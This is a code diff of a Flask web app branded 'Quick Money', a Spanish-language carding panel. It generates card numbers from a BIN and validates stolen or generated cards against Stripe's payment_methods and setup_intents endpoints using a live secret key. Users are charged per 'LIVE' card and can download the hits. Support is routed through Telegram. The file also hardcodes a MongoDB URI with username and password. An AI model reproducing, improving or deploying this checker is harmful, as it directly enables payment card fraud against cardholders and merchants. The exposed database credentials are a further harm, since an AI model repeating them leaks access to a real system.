@@ -3,7 +3,7 @@ from flask import Flask, render_template_string, request, redirect, session, url
 from pymongo import MongoClient
 
 app = Flask(__name__)
-app.secret_key = 'quick_money_v49_nitro'
+app.secret_key = 'quick_money_v49_nitro_master'
 
 # --- [ CONFIGURACIÓN MAESTRA ] ---
 MONGO_URI = "mongodb+srv://mairo:mairo1212@cluster0.inuth4k.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
@@ -12,7 +12,7 @@ try:
     client = MongoClient(MONGO_URI)
     db_mongo = client['quickmoney_db']
     usuarios_col = db_mongo['usuarios']
-    config_col = db_mongo['config'] # Nueva colección para la SK
+    config_col = db_mongo['config']
 except Exception as e:
     print(f"Error MongoDB: {e}")
 
@@ -24,56 +24,45 @@ def check_gate_nitro(cc, sk_key):
         partes = cc.split('|')
         if len(partes) < 4: return {"status": "DEAD", "msg": "FORMATO ERROR"}
         num, mes, ano, cvv = partes[0], partes[1], partes[2], partes[3]
-
         headers = {"Authorization": f"Bearer {sk_key}", "Content-Type": "application/x-www-form-urlencoded"}
-        
-        # 1. Crear Payment Method
         pm_data = {"type": "card", "card[number]": num, "card[exp_month]": int(mes), "card[exp_year]": int(ano), "card[cvc]": cvv}
         pm_res = requests.post('https://api.stripe.com/v1/payment_methods', data=pm_data, headers=headers, timeout=10)
         pm_json = pm_res.json()
-
-        if "error" in pm_json:
-            return {"status": "DEAD", "msg": pm_json['error'].get('message', 'DECLINED').upper()}
-
-        # 2. Setup Intent (Validación sin cargo)
+        if "error" in pm_json: return {"status": "DEAD", "msg": pm_json['error'].get('message', 'DECLINED').upper()}
         si_data = {"payment_method": pm_json['id'], "confirm": "true", "usage": "off_session"}
         si_res = requests.post('https://api.stripe.com/v1/setup_intents', data=si_data, headers=headers, timeout=10)
         si_json = si_res.json()
-
-        if "error" in si_json:
-            return {"status": "DEAD", "msg": si_json['error'].get('decline_code', 'DECLINED').upper()}
-
-        if si_json.get('status') in ['succeeded', 'requires_action', 'processing']:
-            return {"status": "LIVE", "msg": "AUTHORIZED"}
-        
+        if "error" in si_json: return {"status": "DEAD", "msg": si_json['error'].get('decline_code', 'DECLINED').upper()}
+        if si_json.get('status') in ['succeeded', 'requires_action', 'processing']: return {"status": "LIVE", "msg": "AUTHORIZED"}
         return {"status": "DEAD", "msg": "FAILED_AUTH"}
-    except:
-        return {"status": "DEAD", "msg": "GATE_ERROR"}
+    except: return {"status": "DEAD", "msg": "GATE_ERROR"}
 
-# --- [ DISEÑO QUICK MONEY V49 ] ---
+# --- [ DISEÑO MEJORADO V49 NITRO ] ---
 CSS = """
 <style>
     @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap');
-    :root { --gold: #c5a059; --bg: #000; --card: rgba(10, 10, 12, 0.98); --border: #1a1a1e; --green: #2ecc71; --red: #ff4757; }
-    body { background: var(--bg); color: #fff; font-family: 'JetBrains Mono', monospace; margin: 0; padding: 0; min-height: 100vh; overflow-x: hidden; }
-    #bg-canvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1; pointer-events: none; opacity: 0.5; }
-    .container { max-width: 480px; margin: auto; padding: 20px; position: relative; z-index: 10; }
-    .card { background: var(--card); border: 1px solid var(--border); padding: 25px; margin-bottom: 15px; border-radius: 4px; backdrop-filter: blur(10px); }
-    .card-h { font-size: 11px; color: var(--gold); text-transform: uppercase; font-weight: bold; border-bottom: 1px solid var(--border); padding-bottom: 10px; margin-bottom: 15px; display: block; letter-spacing: 2px; }
-    input, textarea { width: 100%; background: #050505; border: 1px solid var(--border); color: #fff; padding: 15px; margin-bottom: 12px; box-sizing: border-box; font-family: inherit; font-size: 13px; outline: none; }
-    .btn { border: none; padding: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 11px; width: 100%; transition: 0.2s; font-family: inherit; border-radius: 2px; }
-    .btn-gold { background: var(--gold); color: #000; margin-top: 10px; }
+    :root { --gold: #c5a059; --bg: #0b0b0d; --card: rgba(15, 15, 18, 0.95); --border: #1e1e24; --green: #2ecc71; --red: #ff4757; }
+    body { background: var(--bg); color: #fff; font-family: 'JetBrains Mono', monospace; margin: 0; padding: 0; min-height: 100vh; }
+    .container { max-width: 600px; margin: auto; padding: 20px; position: relative; z-index: 10; }
+    .card { background: var(--card); border: 1px solid var(--border); padding: 20px; margin-bottom: 20px; border-radius: 4px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+    .card-h { font-size: 10px; color: var(--gold); text-transform: uppercase; font-weight: bold; border-bottom: 1px solid var(--border); padding-bottom: 8px; margin-bottom: 15px; display: block; letter-spacing: 2px; }
+    input, textarea { width: 100%; background: #050505; border: 1px solid var(--border); color: #fff; padding: 12px; margin-bottom: 10px; box-sizing: border-box; font-family: inherit; font-size: 13px; outline: none; border-radius: 2px; }
+    .btn { border: none; padding: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 11px; width: 100%; transition: 0.2s; font-family: inherit; border-radius: 2px; }
+    .btn-gold { background: var(--gold); color: #000; }
     .btn-dark { background: #0a0a0a; color: #fff; border: 1px solid #1a1a1e; }
-    .btn-mini { padding: 6px 10px; width: auto; font-size: 9px; margin: 5px 0; }
-    .res-box { border-radius: 2px; padding: 12px; font-size: 11px; min-height: 100px; border: 1px solid #1a1a1e; background: #030303; overflow-y: auto; max-height: 250px; margin-bottom: 10px; }
-    a { text-decoration: none; color: var(--gold); font-size: 10px; }
+    .btn-mini { padding: 8px 12px; width: auto; font-size: 10px; }
+    .res-box { border-radius: 2px; padding: 10px; font-size: 11px; min-height: 80px; border: 1px solid #1e1e24; background: #030303; overflow-y: auto; max-height: 200px; margin-bottom: 10px; }
+    table { width: 100%; font-size: 10px; border-collapse: collapse; margin-top: 10px; }
+    th { text-align: left; color: var(--gold); border-bottom: 1px solid var(--border); padding: 5px; }
+    td { padding: 8px 5px; border-bottom: 1px solid #111; }
+    .flex-row { display: flex; gap: 10px; align-items: center; }
 </style>
 """
 
 @app.route('/')
 def login():
     if 'user' in session: return redirect(url_for('panel'))
-    return render_template_string(f'<html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head><body><canvas id="bg-canvas"></canvas><div style="display:flex;align-items:center;justify-content:center;height:100vh;position:relative;z-index:10;"><div class="card" style="width:340px; text-align:center;"><h2>⚡️🌩️Quick Money🌩️⚡️</h2><span style="color:var(--gold); font-size:10px;">{{CHK}}</span><br><br><form method="POST" action="/auth"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><button class="btn btn-gold">INGRESAR</button></form><br><a href="/register">¿No tiene cuenta? Regístrese aquí</a></div></div></body></html>')
+    return render_template_string(f'<html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head><body style="display:flex;align-items:center;justify-content:center;height:100vh;"><div class="card" style="width:320px; text-align:center;"><h2>⚡️🌩️Quick Money🌩️⚡️</h2><span style="color:var(--gold); font-size:10px;">{{CHK}}</span><br><br><form method="POST" action="/auth"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><button class="btn btn-gold">INGRESAR</button></form><br><a href="/register" style="color:var(--gold); font-size:10px; text-decoration:none;">¿No tiene cuenta? Regístrese</a></div></body></html>')
 
 @app.route('/register', methods=['GET', 'POST'])
 def register():
@@ -90,61 +79,87 @@ def panel():
     u_data = usuarios_col.find_one({"u": session['user']})
     is_admin = session['user'].lower() == "mairo"
     
-    # Obtener SK actual de la DB
     current_sk = config_col.find_one({"key": "sk_live"})
-    sk_display = current_sk['val'] if current_sk else "NO CONFIGURADA"
+    sk_val = current_sk['val'] if current_sk else ""
+
+    # LISTA DE USUARIOS PARA EL ADMIN
+    all_users = list(usuarios_col.find()) if is_admin else []
 
     return render_template_string(f"""
     <html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head>
     <body><div class="container">
-        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 20px;">
-            <div style="font-size:11px;">ID: <b style="color:var(--gold)">{"ADMIN" if is_admin else session['user'].upper()}</b></div>
-            <div style="border:1px solid var(--gold); padding:8px 15px; color:var(--gold); font-size:11px;">CREDIT: <b id="display_saldo">${u_data['saldo']:.2f}</b></div>
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+            <div style="font-size:11px;">ID: <b style="color:var(--gold)">{session['user'].upper()}</b></div>
+            <div style="border:1px solid var(--gold); padding:8px 12px; color:var(--gold); font-size:11px;">BALANCE: <b id="display_saldo">${u_data['saldo']:.2f}</b></div>
         </div>
 
-        {f'''<div class="card" style="border:1px solid var(--gold)"><span class="card-h">👑 ADMIN NITRO PANEL</span>
-            <form action="/update_sk" method="POST">
-                <input name="new_sk" placeholder="PEGAR SK_LIVE AQUÍ" value="{sk_display}">
-                <button type="submit" class="btn btn-gold btn-mini">ACTUALIZAR LLAVE</button>
+        {f'''<div class="card" style="border:1px solid var(--gold)"><span class="card-h">👑 ADMIN NITRO CONTROL</span>
+            <form action="/update_sk" method="POST" class="flex-row">
+                <input name="new_sk" placeholder="SK_LIVE_..." value="{sk_val}" style="margin-bottom:0;">
+                <button class="btn btn-gold btn-mini">ACTUALIZAR</button>
+            </form>
+            <hr style="border:0; border-top:1px solid #1a1a1e; margin:15px 0;">
+            <form action="/admin_add_saldo" method="POST" class="flex-row">
+                <input name="target_user" placeholder="USER" style="margin-bottom:0;">
+                <input name="amount" type="number" step="0.01" placeholder="$" style="margin-bottom:0; width:80px;">
+                <button class="btn btn-gold btn-mini">CARGAR</button>
             </form>
             <br>
-            <form action="/admin_add_saldo" method="POST">
-                <input name="target_user" placeholder="USUARIO">
-                <input name="amount" type="number" step="0.01" placeholder="CANTIDAD $">
-                <button type="submit" class="btn btn-gold">CARGAR SALDO</button>
-            </form></div>''' if is_admin else ""}
+            <span class="card-h">CLIENTES REGISTRADOS</span>
+            <table>
+                <tr><th>USUARIO</th><th>TELEGRAM</th><th>SALDO</th></tr>
+                {''.join([f"<tr><td>{u['u']}</td><td>{u.get('telegram','-')}</td><td style='color:var(--gold)'>${u['saldo']:.2f}</td></tr>" for u in all_users])}
+            </table>
+        </div>''' if is_admin else ""}
 
-        <div class="card"><span class="card-h">🪄 GENERADOR / CHECKER</span>
-            <input id="bin_val" placeholder="BIN|MM|YYYY" value="47370280484|08|2028">
-            <textarea id="check_list" rows="5" placeholder="CC|MM|YY|CVV"></textarea>
-            <button class="btn btn-gold" id="btn_start" onclick="startChecking()">🚀 INICIAR CHECK ($0.15)</button>
+        <div class="card"><span class="card-h">🪄 GENERADOR DE TARJETAS</span>
+            <div class="flex-row">
+                <input id="bin_val" placeholder="BIN (473702)" value="473702" style="margin-bottom:0;">
+                <button class="btn btn-dark btn-mini" onclick="generar()">GENERAR</button>
+            </div>
+            <br>
+            <span class="card-h">CHECKER GATE NITRO</span>
+            <textarea id="check_list" rows="6" placeholder="CC|MM|YY|CVV"></textarea>
+            <button class="btn btn-gold" id="btn_start" onclick="startChecking()">🚀 INICIAR PROCESO ($0.15)</button>
         </div>
 
-        <div style="display:flex; justify-content:space-between; align-items:center;"><span style="color:var(--green); font-size:10px;">LIVES ✅</span> <button class="btn btn-dark btn-mini" onclick="descargarLives()">📥 DESCARGAR</button></div>
+        <div style="display:flex; justify-content:space-between;"><span style="color:var(--green); font-size:10px;">LIVES ✅</span> <button class="btn btn-dark btn-mini" onclick="descargarLives()">DESCARGAR</button></div>
         <div class="res-box" id="lives_log"></div>
-        <div style="display:flex; justify-content:space-between; align-items:center;"><span style="color:var(--red); font-size:10px;">DEAD ❌</span></div>
-        <div class="res-box" id="dead_log" style="opacity:0.6;"></div>
+        <div style="color:var(--red); font-size:10px;">DEAD ❌</div>
+        <div class="res-box" id="dead_log" style="opacity:0.5;"></div>
 
-        <div style="text-align:center; margin-top:20px;">
-            <a href="https://t.me/quickmoney_support24" target="_blank">🔵 SOPORTE</a> | 
-            <a href="https://t.me/+GUlp9rhO0_k1ZWYx" target="_blank">🔵 GRUPO</a> | 
-            <a href="/logout">[ SALIR ]</a>
+        <div style="text-align:center; margin-top:20px; font-size:10px;">
+            <a href="https://t.me/quickmoney_support24" style="color:var(--gold)">SOPORTE</a> | 
+            <a href="https://t.me/+GUlp9rhO0_k1ZWYx" style="color:var(--gold)">GRUPO</a> | 
+            <a href="/logout" style="color:#666">SALIR</a>
         </div>
     </div>
     <script>
+    function generar() {{
+        let bin = document.getElementById('bin_val').value;
+        if(bin.length < 6) return alert('BIN INVÁLIDO');
+        let out = "";
+        for(let i=0; i<10; i++) {{
+            let n = bin; while(n.length < 16) n += Math.floor(Math.random()*10);
+            let m = ["01","02","03","04","05","06","07","08","09","10","11","12"][Math.floor(Math.random()*12)];
+            let y = 2025 + Math.floor(Math.random()*6);
+            let c = Math.floor(Math.random()*899)+100;
+            out += n+"|"+m+"|"+y+"|"+c+"\\n";
+        }}
+        document.getElementById('check_list').value = out;
+    }}
     async function startChecking() {{
         let a = document.getElementById('check_list'); let lines = a.value.trim().split('\\n');
         if(!lines[0]) return; document.getElementById('btn_start').disabled = true;
         for (let cc of lines) {{
-            let r = await fetch('/validar_card', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{card:cc}})}});
+            let r = await fetch('/validar_card', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{card:cc.trim()}})}});
             let d = await r.json();
             if(d.status === 'LIVE') {{
                 document.getElementById('display_saldo').innerText = '$' + d.nuevo_saldo.toFixed(2);
-                document.getElementById('lives_log').innerHTML = '<div style="color:var(--green);">'+cc+' | AUTHORIZED</div>' + document.getElementById('lives_log').innerHTML;
+                document.getElementById('lives_log').innerHTML = '<div style="color:var(--green); margin-bottom:5px;">'+cc+' | AUTHORIZED</div>' + document.getElementById('lives_log').innerHTML;
             }} else {{
-                document.getElementById('dead_log').innerHTML = '<div style="color:#666;">'+cc+' | '+d.msg+'</div>' + document.getElementById('dead_log').innerHTML;
+                document.getElementById('dead_log').innerHTML = '<div>'+cc+' | '+d.msg+'</div>' + document.getElementById('dead_log').innerHTML;
             }}
-            await new Promise(r => setTimeout(r, 1000));
         }}
         document.getElementById('btn_start').disabled = false;
     }}
@@ -169,10 +184,8 @@ def validar():
     if u_data['saldo'] < COSTO_LIVE: return jsonify({"status":"DEAD", "msg": "SIN SALDO"})
     sk_data = config_col.find_one({"key": "sk_live"})
     if not sk_data: return jsonify({"status":"DEAD", "msg": "SK NO CONFIG"})
-    
     cc = request.json.get('card', '')
     res = check_gate_nitro(cc, sk_data['val'])
-    
     if res['status'] == 'LIVE':
         new_s = round(u_data['saldo'] - COSTO_LIVE, 2)
         usuarios_col.update_one({"u": session['user']}, {"$set": {"saldo": new_s}})
